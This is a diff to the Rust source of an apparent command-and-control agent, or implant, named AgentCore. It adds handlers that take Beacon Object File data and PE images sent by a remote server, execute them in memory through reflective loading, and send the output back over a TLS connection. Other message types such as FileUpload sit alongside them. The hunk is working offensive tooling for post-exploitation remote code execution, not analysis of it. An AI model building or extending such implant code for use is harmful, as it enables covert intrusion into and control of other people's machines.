@@ -960,6 +960,59 @@ impl AgentCore {
                     command
                 );
             }
+            Message::BofExecutionRequest {
+                bof_data,
+                args,
+                entry_point,
+            } => {
+                info!(
+                    "{} Server requested BOF execution: {}",
+                    styling::SUCCESS_INDICATOR,
+                    entry_point
+                );
+
+                let os = OSDetector::detect_os();
+                let executor = CommandExecutor::new(&os);
+
+                let response = match executor.execute_bof(bof_data, args, &entry_point).await {
+                    Ok(output) => Message::BofExecutionResponse {
+                        output,
+                        error: None,
+                    },
+                    Err(e) => Message::BofExecutionResponse {
+                        output: String::new(),
+                        error: Some(e.to_string()),
+                    },
+                };
+
+                let response_str = serde_json::to_string(&response)?;
+                tls_writer.write_all(response_str.as_bytes()).await?;
+                tls_writer.write_all(b"\n").await?;
+            }
+            Message::ReflectiveLoadRequest { pe_data, args } => {
+                info!(
+                    "{} Server requested reflective loading",
+                    styling::SUCCESS_INDICATOR
+                );
+
+                let os = OSDetector::detect_os();
+                let executor = CommandExecutor::new(&os);
+
+                let response = match executor.execute_reflective(pe_data, &args).await {
+                    Ok(output) => Message::ReflectiveLoadResponse {
+                        output,
+                        error: None,
+                    },
+                    Err(e) => Message::ReflectiveLoadResponse {
+                        output: String::new(),
+                        error: Some(e.to_string()),
+                    },
+                };
+
+                let response_str = serde_json::to_string(&response)?;
+                tls_writer.write_all(response_str.as_bytes()).await?;
+                tls_writer.write_all(b"\n").await?;
+            }
             Message::FileUpload {
                 remote_path,
                 content_b64,
